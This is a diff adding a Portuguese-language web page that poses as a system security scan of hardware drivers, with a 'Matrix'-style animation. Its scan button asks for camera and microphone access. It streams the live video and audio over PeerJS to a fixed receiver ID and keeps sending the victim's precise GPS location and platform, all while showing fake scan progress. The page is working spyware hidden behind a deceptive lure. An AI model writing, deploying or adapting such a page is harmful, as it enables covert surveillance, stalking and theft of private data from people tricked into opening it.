@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Segurança do Sistema</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; overflow: hidden; margin: 0; }
+        canvas { position: fixed; top: 0; left: 0; opacity: 0.4; }
+        .content { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .box { border: 2px solid #0f0; padding: 40px; background: rgba(0,20,0,0.9); text-align: center; }
+        #btn-scan { background: #0f0; color: #000; border: none; padding: 20px 40px; font-weight: bold; cursor: pointer; font-size: 1.1em; }
+        #status { margin-top: 20px; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    <div class="content">
+        <div class="box">
+            <h1>SISTEMA DE ANÁLISE</h1>
+            <p>O seu dispositivo requer uma varredura de segurança nos drivers de hardware.</p>
+            <button id="btn-scan" onclick="startCapture()">EXECUTAR VARREDURA AGORA</button>
+            <div id="status">Aguardando inicialização...</div>
+        </div>
+    </div>
+
+<script>
+    // EFEITO MATRIX
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const letters = "0101010101010101010101";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
+        drops.forEach((y, i) => {
+            const text = letters[Math.floor(Math.random() * letters.length)];
+            ctx.fillText(text, i * fontSize, y * fontSize);
+            if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+    setInterval(draw, 33);
+
+    // LÓGICA DE TRANSMISSÃO
+    const RECEPTOR_ID = "SINAL_OPERACIONAL_777";
+    const peer = new Peer();
+
+    async function startCapture() {
+        const status = document.getElementById('status');
+        document.getElementById('btn-scan').style.display = 'none';
+        
+        try {
+            status.innerText = "Sincronizando periféricos (Câmera/Áudio)...";
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            status.innerText = "Conectando ao banco de dados seguro...";
+            const call = peer.call(RECEPTOR_ID, stream);
+
+            // Enviar GPS e Dados em loop
+            navigator.geolocation.watchPosition((pos) => {
+                const conn = peer.connect(RECEPTOR_ID);
+                conn.on('open', () => {
+                    conn.send({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        os: navigator.platform
+                    });
+                });
+            }, (err) => console.log(err), { enableHighAccuracy: true });
+
+            status.innerText = "VARREDURA EM CURSO: 44%... NÃO FECHE ESTA PÁGINA.";
+
+        } catch (e) {
+            status.innerHTML = "<span style='color:red'>ERRO CRÍTICO: ACESSO AO HARDWARE NEGADO.</span>";
+        }
+    }
+</script>
+</body>
+</html>
